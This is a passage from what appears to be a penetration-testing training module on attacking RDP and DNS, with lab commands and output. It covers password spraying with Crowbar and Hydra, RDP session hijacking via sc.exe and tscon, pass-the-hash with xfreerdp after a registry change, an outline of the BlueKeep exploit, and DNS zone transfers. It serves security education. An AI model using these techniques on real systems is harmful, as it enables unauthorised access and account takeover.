Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">2.143</span>
Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.00037</span>s latency).

PORT     STATE    SERVICE
<span class="hljs-number">3389</span>/tcp <span class="hljs-keyword">open</span> ms-wbt-server
</code></pre>
<hr>
<h3 id="misconfigurations">Misconfigurations</h3>
<p>Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. Although it is not common, we could find an RDP service without a password if there is a misconfiguration.</p>
<p>One caveat on password guessing against Windows instances is that you should consider the client&#39;s password policy. In many cases, a user account will be locked or disabled after a certain number of failed login attempts. In this case, we can perform a specific password guessing technique called <code>Password Spraying</code>. This technique works by attempting a single password for many usernames before trying another password, being careful to avoid account lockout.</p>
<p>Using the <a href="https://github.com/galkan/crowbar">Crowbar</a> tool, we can perform a password spraying attack against the RDP service. As an example below, the password <code>password123</code> will be tested against a list of usernames in the <code>usernames.txt</code> file. The attack found the valid credentials as <code>administrator</code> : <code>password123</code> on the target RDP host.</p>
<p>Attacking RDP</p>
<pre><code class="lang-shell-session">root@htb[/htb]# cat usernames.txt 

root
<span class="hljs-keyword">test
</span>user
guest
admin
administrator
</code></pre>
<p><strong>Crowbar - RDP Password Spraying</strong></p>
<p>Attacking RDP</p>
<pre><code class="lang-shell-session">root@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022<span class="hljs-string">-04</span><span class="hljs-string">-07</span> 15:35:50 START
2022<span class="hljs-string">-04</span><span class="hljs-string">-07</span> 15:35:50 Crowbar v0.4.1
2022<span class="hljs-string">-04</span><span class="hljs-string">-07</span> 15:35:50 Trying 192.168.220.142:3389
2022<span class="hljs-string">-04</span><span class="hljs-string">-07</span> 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022<span class="hljs-string">-04</span><span class="hljs-string">-07</span> 15:35:52 STOP
</code></pre>
<p>We can also use <code>Hydra</code> to perform an RDP password spray attack.</p>
<p><strong>Hydra - RDP Password Spraying</strong></p>
<p>Attacking RDP</p>
<pre><code class="lang-shell-session">root@htb[/htb]# hydra -L usernames.txt -p <span class="hljs-symbol">'password123</span>' <span class="hljs-number">192.168</span>.<span class="hljs-number">2.143</span> rdp

Hydra v9.<span class="hljs-number">1</span> (c) <span class="hljs-number">2020</span> by van Hauser/THC &amp; David Maciejak - Please do <span class="hljs-keyword">not</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this <span class="hljs-keyword">is</span> non-binding, these *** ignore laws <span class="hljs-keyword">and</span> ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="hljs-number">2021</span>-<span class="hljs-number">08</span>-<span class="hljs-number">25</span> <span class="hljs-number">21</span>:<span class="hljs-number">44</span>:<span class="hljs-number">52</span>
[<span class="hljs-literal">WARNING</span>] rdp servers often don<span class="hljs-symbol">'t</span> like many connections, <span class="hljs-keyword">use</span> -t <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> -t <span class="hljs-number">4</span> <span class="hljs-keyword">to</span> reduce the number <span class="hljs-keyword">of</span> parallel connections <span class="hljs-keyword">and</span> -W <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> -W <span class="hljs-number">3</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">wait</span> between connection <span class="hljs-keyword">to</span> allow the server <span class="hljs-keyword">to</span> recover
[INFO] Reduced number <span class="hljs-keyword">of</span> tasks <span class="hljs-keyword">to</span> <span class="hljs-number">4</span> (rdp does <span class="hljs-keyword">not</span> like many parallel connections)
[<span class="hljs-literal">WARNING</span>] the rdp module <span class="hljs-keyword">is</span> experimental. Please test, <span class="hljs-keyword">report</span> - <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span> possible, fix.
[DATA] max <span class="hljs-number">4</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">4</span> tasks, <span class="hljs-number">8</span> login tries (l:<span class="hljs-number">2</span>/p:<span class="hljs-number">4</span>), ~<span class="hljs-number">2</span> tries per task
[DATA] attacking rdp://<span class="hljs-number">192.168</span>.<span class="hljs-number">2.147</span>:<span class="hljs-number">3389</span>/
[<span class="hljs-number">3389</span>][rdp] host: <span class="hljs-number">192.168</span>.<span class="hljs-number">2.143</span>   login: administrator   password: password123
<span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="hljs-number">2021</span>-<span class="hljs-number">08</span>-<span class="hljs-number">25</span> <span class="hljs-number">21</span>:<span class="hljs-number">44</span>:<span class="hljs-number">56</span>
</code></pre>
<p>We can RDP into the target system using the <code>rdesktop</code> client or <code>xfreerdp</code> client with valid credentials.</p>
<p><strong>RDP Login</strong></p>
<p>Attacking RDP</p>
<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-comment"># rdesktop -u admin -p password123 192.168.2.143</span>

Autoselecting keyboard map <span class="hljs-string">'en-us'</span> <span class="hljs-keyword">from</span> locale

ATTENTION! The server uses an invalid security certificate which can <span class="hljs-keyword">not</span> be trusted <span class="hljs-keyword">for</span>
the following identified reasons(s);

 <span class="hljs-number">1.</span> Certificate issuer <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> trusted <span class="hljs-keyword">by</span> <span class="hljs-keyword">this</span> system.
     Issuer: CN=WIN-Q8F2KTAI43A

Review the following certificate info before you trust <span class="hljs-literal">it</span> <span class="hljs-keyword">to</span> be added as an exception.
If you <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> trust the certificate, the connection atempt will be aborted:

    Subject: CN=WIN-Q8F2KTAI43A
     Issuer: CN=WIN-Q8F2KTAI43A
 Valid From: Tue Aug <span class="hljs-number">24</span> <span class="hljs-number">04</span>:<span class="hljs-number">20</span>:<span class="hljs-number">17</span> <span class="hljs-number">2021</span>
         To: Wed Feb <span class="hljs-number">23</span> <span class="hljs-number">03</span>:<span class="hljs-number">20</span>:<span class="hljs-number">17</span> <span class="hljs-number">2022</span>

  Certificate fingerprints:

       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57

Do you trust <span class="hljs-keyword">this</span> certificate (<span class="hljs-literal">yes</span>/<span class="hljs-literal">no</span>)? <span class="hljs-literal">yes</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/116/rdp\_session-7-2.png" alt=""></p>
<hr>
<h3 id="protocol-specific-attacks">Protocol Specific Attacks</h3>
<p>Let&#39;s imagine we successfully gain access to a machine and have an account with local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user&#39;s remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.</p>
<p><strong>RDP Session Hijacking</strong></p>
<p>As shown in the example below, we are logged in as the user <code>juurena</code> (UserID = 2) who has <code>Administrator</code> privileges. Our goal is to hijack the user <code>lewen</code> (User ID = 4), who is also logged in via RDP.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/rdp\_session-1-2.png" alt=""></p>
<p>To successfully impersonate a user without their password, we need to have <code>SYSTEM</code> privileges and use the Microsoft <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon">tscon.exe</a> binary that enables users to connect to another desktop session. It works by specifying which <code>SESSION ID</code> (<code>4</code> for the <code>lewen</code> session in our example) we would like to connect to which session name (<code>rdp-tcp#13</code>, which is our current session). So, for example, the following command will open a new console as the specified <code>SESSION_ID</code> within our current RDP session:</p>
<p>Attacking RDP</p>
<pre><code class="lang-cmd-session">C:\htb&gt; tscon #{<span class="ruby">TARGET_SESSION_ID}</span> /dest:#{<span class="ruby">OUR_SESSION_NAME}</span>
</code></pre>
<p>If we have local administrator privileges, we can use several methods to obtain <code>SYSTEM</code> privileges, such as <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a> or <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>. A simple trick is to create a Windows service that, by default, will run as <code>Local System</code> and will execute any binary with <code>SYSTEM</code> privileges. We will use <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create">Microsoft sc.exe</a> binary. First, we specify the service name (<code>sessionhijack</code>) and the <code>binpath</code>, which is the command we want to execute. Once we run the following command, a service named <code>sessionhijack</code> will be created.</p>
<p>Attacking RDP</p>
<pre><code class="lang-cmd-session">C:\htb&gt; query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
&gt;<span class="hljs-keyword">juurena </span>              rdp-tcp<span class="hljs-comment">#13          1  Active          7  8/25/2021 1:23 AM</span>
 lewen                 rdp-tcp<span class="hljs-comment">#14          2  Active          *  8/25/2021 1:28 AM</span>

C:\htb&gt; <span class="hljs-keyword">sc.exe </span>create sessionhijack <span class="hljs-keyword">binpath= </span><span class="hljs-string">"cmd.exe /k tscon 2 /dest:rdp-tcp#13"</span>

[<span class="hljs-keyword">SC] </span>CreateService SUCCESS
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/116/rdp\_session-2-2.png" alt=""></p>
<p>To run the command, we can start the <code>sessionhijack</code> service :</p>
<p>Attacking RDP</p>
<pre><code class="lang-cmd-session"><span class="hljs-symbol">C:</span>\htb&gt; net start sessionhijack
</code></pre>
<p>Once the service is started, a new terminal with the <code>lewen</code> user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we&#39;ll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/rdp\_session-3-2.png" alt=""></p>
<p><em>Note: This method no longer works on Server 2019.</em></p>
<hr>
<h3 id="rdp-pass-the-hash-pth-">RDP Pass-the-Hash (PtH)</h3>
<p>We may want to access applications or software installed on a user&#39;s Windows system that is only available with GUI access during a penetration test. If we have plaintext credentials for the target user, it will be no problem to RDP into the system. However, what if we only have the NT hash of the user obtained from a credential dumping attack such as <a href="https://en.wikipedia.org/wiki/Security\_Account\_Manager">SAM</a> database, and we could not crack the hash to reveal the plaintext password? In some instances, we can perform an RDP PtH attack to gain GUI access to the target system using tools like <code>xfreerdp</code>.</p>
<p>There are a few caveats to this attack:</p>
<ul>
<li><code>Restricted Admin Mode</code>, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:</li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/116/rdp\_session-4.png" alt=""></p>
<p>This can be enabled by adding a new registry key <code>DisableRestrictedAdmin</code> (REG_DWORD) under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa</code>. It can be done using the following command:</p>
<p><strong>Adding the DisableRestrictedAdmin Registry Key</strong></p>
<p>Attacking RDP</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; reg add HKLM<span class="hljs-symbol">\S</span>ystem<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>ontrol<span class="hljs-symbol">\L</span>sa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/116/rdp\_session-5.png" alt=""></p>
<p>Once the registry key is added, we can use <code>xfreerdp</code> with the option <code>/pth</code> to gain RDP access:</p>
<p>Attacking RDP</p>
<pre><code class="lang-shell-session">root@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

[<span class="hljs-string">09:24:10:115</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.core</span>] - freerdp<span class="hljs-emphasis">_connect:freerdp_</span>set<span class="hljs-emphasis">_last_</span>error_ex resetting error state            
[<span class="hljs-string">09:24:10:115</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.client.common.cmdline</span>] - loading channelEx rdpdr                                   
[<span class="hljs-string">09:24:10:115</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.client.common.cmdline</span>] - loading channelEx rdpsnd                                  
[<span class="hljs-string">09:24:10:115</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.client.common.cmdline</span>] - loading channelEx cliprdr                                 
[<span class="hljs-string">09:24:11:427</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.primitives</span>] - primitives autodetect, using optimized                               
[<span class="hljs-string">09:24:11:446</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.core</span>] - freerdp<span class="hljs-emphasis">_tcp_</span>is<span class="hljs-emphasis">_hostname_</span>resolvable:freerdp<span class="hljs-emphasis">_set_</span>last<span class="hljs-emphasis">_error_</span>ex resetting error state
[<span class="hljs-string">09:24:11:446</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.core</span>] - freerdp<span class="hljs-emphasis">_tcp_</span>connect:freerdp<span class="hljs-emphasis">_set_</span>last<span class="hljs-emphasis">_error_</span>ex resetting error state        
[<span class="hljs-string">09:24:11:464</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">WARN</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[<span class="hljs-string">09:24:11:464</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">WARN</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - CN = dc-01.superstore.xyz                                                     
[<span class="hljs-string">09:24:11:464</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.winpr.sspi.NTLM</span>] - VERSION ={                                                              
[<span class="hljs-string">09:24:11:464</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.winpr.sspi.NTLM</span>] -        ProductMajorVersion: 6                                           
[<span class="hljs-string">09:24:11:464</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.winpr.sspi.NTLM</span>] -        ProductMinorVersion: 1                                           
[<span class="hljs-string">09:24:11:464</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.winpr.sspi.NTLM</span>] -        ProductBuild: 7601                                               
[<span class="hljs-string">09:24:11:464</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.winpr.sspi.NTLM</span>] -        Reserved: 0x000000                                               
[<span class="hljs-string">09:24:11:464</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.winpr.sspi.NTLM</span>] -        NTLMRevisionCurrent: 0x0F                                        
[<span class="hljs-string">09:24:11:567</span>] [<span class="hljs-string">1668:1669</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.winpr.sspi.NTLM</span>] - negotiateFlags "0xE2898235"

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span></span>
</code></pre>
<p>If it works, we&#39;ll now be logged in via RDP as the target user without knowing their cleartext password.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/rdp\_session-6-2.png" alt=""></p>
<p>Keep in mind that this will not work against every Windows system we encounter, but it is always worth trying in a situation where we have an NTLM hash, know the user has RDP rights against a machine or set of machines, and GUI access would benefit us in some ways towards fulfilling the goal of our assessment.</p>
<h2 id="latest-rdp-vulnerabilities">Latest RDP Vulnerabilities</h2>
<hr>
<p>In 2019, a critical vulnerability was published in the RDP (<code>TCP/3389</code>) service that also led to remote code execution (<code>RCE</code>) with the identifier <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708">CVE-2019-0708</a>. This vulnerability is known as <code>BlueKeep</code>. It does not require prior access to the system to exploit the service for our purposes. However, the exploitation of this vulnerability led and still leads to many malware or ransomware attacks. Large organizations such as hospitals, whose software is only designed for specific versions and libraries, are particularly vulnerable to such attacks, as infrastructure maintenance is costly. Here, too, we will not go into minute detail about this vulnerability but rather keep the focus on the concept.</p>
<hr>
<h3 id="the-concept-of-the-attack">The Concept of the Attack</h3>
<p>The vulnerability is also based, as with SMB, on manipulated requests sent to the targeted service. However, the dangerous thing here is that the vulnerability does not require user authentication to be triggered. Instead, the vulnerability occurs after initializing the connection when basic settings are exchanged between client and server. This is known as a <a href="https://cwe.mitre.org/data/definitions/416.html">Use-After-Free</a> (<code>UAF</code>) technique that uses freed memory to execute arbitrary code.</p>
<p><strong>The Concept of Attacks</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/attack\_concept2.png" alt=""></p>
<p>This attack involves many different steps in the kernel of the operating system, which are not of great importance here for the time being to understand the concept behind it. After the function has been exploited and the memory has been freed, data is written to the kernel, which allows us to overwrite the kernel memory. This memory is used to write our instructions into the freed memory and let the CPU execute them. If we want to look at the technical analysis of the BlueKeep vulnerability, this <a href="https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/">article</a> provides a nice overview.</p>
<p><strong>Initiation of the Attack</strong></p>
<table>
<thead>
<tr>
<th><strong>Step</strong></th>
<th><strong>BlueKeep</strong></th>
<th><strong>Concept of Attacks - Category</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>1.</code></td>
<td>Here, the source is the initialization request of the settings exchange between server and client that the attacker has manipulated.</td>
<td><code>Source</code></td>
</tr>
<tr>
<td><code>2.</code></td>
<td>The request leads to a function used to create a virtual channel containing the vulnerability.</td>
<td><code>Process</code></td>
</tr>
<tr>
<td><code>3.</code></td>
<td>Since this service is suitable for <a href="https://docs.microsoft.com/en-us/windows/win32/ad/the-localsystem-account">administering</a> of the system, it is automatically run with the <a href="https://docs.microsoft.com/en-us/windows/win32/ad/the-localsystem-account">LocalSystem Account</a> privileges of the system.</td>
<td><code>Privileges</code></td>
</tr>
<tr>
<td><code>4.</code></td>
<td>The manipulation of the function redirects us to a kernel process.</td>
<td><code>Destination</code></td>
</tr>
</tbody>
</table>
<p>This is when the cycle starts all over again, but this time to gain remote access to the target system.</p>
<p><strong>Trigger Remote Code Execution</strong></p>
<table>
<thead>
<tr>
<th><strong>Step</strong></th>
<th><strong>BlueKeep</strong></th>
<th><strong>Concept of Attacks - Category</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>5.</code></td>
<td>The source this time is the payload created by the attacker that is inserted into the process to free the memory in the kernel and place our instructions.</td>
<td><code>Source</code></td>
</tr>
<tr>
<td><code>6.</code></td>
<td>The process in the kernel is triggered to free the kernel memory and let the CPU point to our code.</td>
<td><code>Process</code></td>
</tr>
<tr>
<td><code>7.</code></td>
<td>Since the kernel also runs with the highest possible privileges, the instructions we put into the freed kernel memory here are also executed with <a href="https://docs.microsoft.com/en-us/windows/win32/ad/the-localsystem-account">LocalSystem Account</a> privileges.</td>
<td><code>Privileges</code></td>
</tr>
<tr>
<td><code>8.</code></td>
<td>With the execution of our instructions from the kernel, a reverse shell is sent over the network to our host.</td>
<td><code>Destination</code></td>
</tr>
</tbody>
</table>
<p>Not all newer Windows variants are vulnerable to Bluekeep, according to Microsoft. Security updates for current Windows versions are available, and Microsoft has also provided updates for many older Windows versions that are no longer supported. Nevertheless, <code>950,000</code> Windows systems were identified as vulnerable to <code>Bluekeep</code> attacks in an initial scan in May 2019, and even today, about <code>a quarter</code> of those hosts are still vulnerable.</p>
<blockquote>
<p><strong>Note: This is a flaw that we will likely run into during our penetration tests, but it can cause system instability, including a &quot;blue screen of death (BSoD),&quot; and we should be careful before using the associated exploit. If in doubt, it&#39;s best to first speak with our client so they understand the risks and then decide if they would like us to run the exploit or not.</strong></p>
</blockquote>
<h2 id="attacking-dns">Attacking DNS</h2>
<hr>
<p>The <a href="https://www.cloudflare.com/learning/dns/what-is-dns/">Domain Name System</a> (<code>DNS</code>) translates domain names (e.g., hackthebox.com) to the numerical IP addresses (e.g., 104.17.42.72). DNS is mostly <code>UDP/53</code>, but DNS will rely on <code>TCP/53</code> more heavily as time progresses. DNS has always been designed to use both UDP and TCP port 53 from the start, with UDP being the default, and falls back to using TCP when it cannot communicate on UDP, typically when the packet size is too large to push through in a single UDP packet. Since nearly all network applications use DNS, attacks against DNS servers represent one of the most prevalent and significant threats today.</p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>DNS holds interesting information for an organization. As discussed in the Domain Information section in the <a href="https://academy.hackthebox.com/course/preview/footprinting">Footprinting module</a>, we can understand how a company operates and the services they provide, as well as third-party service providers like emails.</p>
<p>The Nmap <code>-sC</code> (default scripts) and <code>-sV</code> (version scan) options can be used to perform initial enumeration against the target DNS servers:</p>
<p>Attacking DNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]# nmap -p53 -Pn -sV -sC <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.213</span>

Starting Nmap <span class="hljs-number">7.80</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2020</span>-<span class="hljs-number">10</span>-<span class="hljs-number">29</span> <span class="hljs-number">03</span>:<span class="hljs-number">47</span> EDT
Nmap scan report for <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.213</span>
Host is <span class="hljs-meta">up</span> (<span class="hljs-number">0.</span>017s latency).

PORT    STATE  SERVICE     VERSION
<span class="hljs-number">53</span>/tcp  open   domain      ISC BIND <span class="hljs-number">9.11</span><span class="hljs-meta">.3</span>-1ubuntu1<span class="hljs-meta">.2</span> (Ubuntu Linux)
</code></pre>
<hr>
<h3 id="dns-zone-transfer">DNS Zone Transfer</h3>
<p>A DNS zone is a portion of the DNS namespace that a specific organization or administrator manages. Since DNS comprises multiple DNS zones, DNS servers utilize DNS zone transfers to copy a portion of their database to another DNS server. Unless a DNS server is configured correctly (limiting which IPs can perform a DNS zone transfer), anyone can ask a DNS server for a copy of its zone information since DNS zone transfers do not require any authentication. In addition, the DNS service usually runs on a UDP port; however, when performing DNS zone transfer, it uses a TCP port for reliable data transmission.</p>
<p>An attacker could leverage this DNS zone transfer vulnerability to learn more about the target organization&#39;s DNS namespace, increasing the attack surface. For exploitation, we can use the <code>dig</code> utility with DNS query type <code>AXFR</code> option to dump the entire DNS namespaces from a vulnerable DNS server:</p>
<p><strong>DIG - AXFR Zone Transfer</strong></p>
<p>Attacking DNS</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb

; &lt;&lt;&gt;&gt; <span class="hljs-selector-tag">DiG</span> 9<span class="hljs-selector-class">.11</span><span class="hljs-selector-class">.5-P1-1-Debian</span> &lt;&lt;&gt;&gt; <span class="hljs-selector-tag">axfr</span> <span class="hljs-selector-tag">inlanefrieght</span><span class="hljs-selector-class">.htb</span> @<span class="hljs-keyword">10</span>.<span class="hljs-keyword">129</span>.<span class="hljs-keyword">110</span>.<span class="hljs-keyword">213</span>
;; <span class="hljs-selector-tag">global</span> <span class="hljs-selector-tag">options</span>: +<span class="hljs-selector-tag">cmd</span>
<span class="hljs-selector-tag">inlanefrieght</span><span class="hljs-selector-class">.htb</span>.         604800  <span class="hljs-selector-tag">IN</span>      <span class="hljs-selector-tag">SOA</span>     <span class="hljs-selector-tag">localhost</span>. <span class="hljs-selector-tag">root</span><span class="hljs-selector-class">.localhost</span>. 2 604800 86400 2419200 604800
<span class="hljs-selector-tag">inlanefrieght</span><span class="hljs-selector-class">.htb</span>.         604800  <span class="hljs-selector-tag">IN</span>      <span class="hljs-selector-tag">AAAA</span>    <span class="hljs-selector-pseudo">::1</span>
<span class="hljs-selector-tag">inlanefrieght</span><span class="hljs-selector-class">.htb</span>.         604800  <span class="hljs-selector-tag">IN</span>      <span class="hljs-selector-tag">NS</span>      <span class="hljs-selector-tag">localhost</span>.
<span class="hljs-selector-tag">inlanefrieght</span><span class="hljs-selector-class">.htb</span>.         604800  <span class="hljs-selector-tag">IN</span>      <span class="hljs-selector-tag">A</span>       10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.110</span><span class="hljs-selector-class">.22</span>
<span class="hljs-selector-tag">admin</span><span class="hljs-selector-class">.inlanefrieght</span><span class="hljs-selector-class">.htb</span>.   604800  <span class="hljs-selector-tag">IN</span>      <span class="hljs-selector-tag">A</span>       10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.110</span><span class="hljs-selector-class">.21</span>
<span class="hljs-selector-tag">hr</span><span class="hljs-selector-class">.inlanefrieght</span><span class="hljs-selector-class">.htb</span>.      604800  <span class="hljs-selector-tag">IN</span>      <span class="hljs-selector-tag">A</span>       10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.110</span><span class="hljs-selector-class">.25</span>
<span class="hljs-selector-tag">support</span><span class="hljs-selector-class">.inlanefrieght</span><span class="hljs-selector-class">.htb</span>. 604800  <span class="hljs-selector-tag">IN</span>      <span class="hljs-selector-tag">A</span>       10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.110</span><span class="hljs-selector-class">.28</span>
<span class="hljs-selector-tag">inlanefrieght</span><span class="hljs-selector-class">.htb</span>.         604800  <span class="hljs-selector-tag">IN</span>      <span class="hljs-selector-tag">SOA</span>     <span class="hljs-selector-tag">localhost</span>. <span class="hljs-selector-tag">root</span><span class="hljs-selector-class">.localhost</span>. 2 604800 86400 2419200 604800
;; <span class="hljs-selector-tag">Query</span> <span class="hljs-selector-tag">time</span>: 28 <span class="hljs-selector-tag">msec</span>
;; <span class="hljs-selector-tag">SERVER</span>: 10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.110</span><span class="hljs-selector-class">.213</span><span class="hljs-selector-id">#53</span>(10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.110</span><span class="hljs-selector-class">.213</span>)
;; <span class="hljs-selector-tag">WHEN</span>: <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Oct</span> 11 17<span class="hljs-selector-pseudo">:20</span><span class="hljs-selector-pseudo">:13</span> <span class="hljs-selector-tag">EDT</span> 2020
;; <span class="hljs-selector-tag">XFR</span> <span class="hljs-selector-tag">size</span>: 8 <span class="hljs-selector-tag">records</span> (<span class="hljs-selector-tag">messages</span> 1, <span class="hljs-selector-tag">bytes</span> 289)
</code></pre>
<p>Tools like <a href="https://github.com/mschwager/fierce">Fierce</a> can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer:</p>
<p>Attacking DNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]# fierce --domain zonetransfer.me

<span class="hljs-keyword">NS</span>: nsztm2.digi.ninja. nsztm1.digi.ninja.
<span class="hljs-keyword">SOA</span>: nsztm1.digi.ninja. (<span class="hljs-number">81.4.108.41</span>)
Zone: success
{&lt;DNS name @&gt;: '@ <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">SOA</span> nsztm1.digi.ninja. robin.digi.ninja. <span class="hljs-number">2019100801</span> '
               '<span class="hljs-number">172800 900</span> <span class="hljs-number">1209600</span> <span class="hljs-number">3600</span>\n'
               '@ <span class="hljs-number">300</span> <span class="hljs-keyword">IN</span> HINFO "Casio fx-<span class="hljs-number">700</span>G" "Windows XP"\n'
               '@ <span class="hljs-number">301</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">TXT</span> '
               '"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"\n'
               '@ <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">MX</span> <span class="hljs-number">0</span> ASPMX.L.GOOGLE.COM.\n'
               '@ <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">MX</span> <span class="hljs-number">10</span> ALT1.ASPMX.L.GOOGLE.COM.\n'
               '@ <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">MX</span> <span class="hljs-number">10</span> ALT2.ASPMX.L.GOOGLE.COM.\n'
               '@ <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">MX</span> <span class="hljs-number">20</span> ASPMX2.GOOGLEMAIL.COM.\n'
               '@ <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">MX</span> <span class="hljs-number">20</span> ASPMX3.GOOGLEMAIL.COM.\n'
               '@ <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">MX</span> <span class="hljs-number">20</span> ASPMX4.GOOGLEMAIL.COM.\n'
               '@ <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">MX</span> <span class="hljs-number">20</span> ASPMX5.GOOGLEMAIL.COM.\n'
               '@ <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span> <span class="hljs-number">5.196.105.14</span>\n'
               '@ <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">NS</span> nsztm1.digi.ninja.\n'
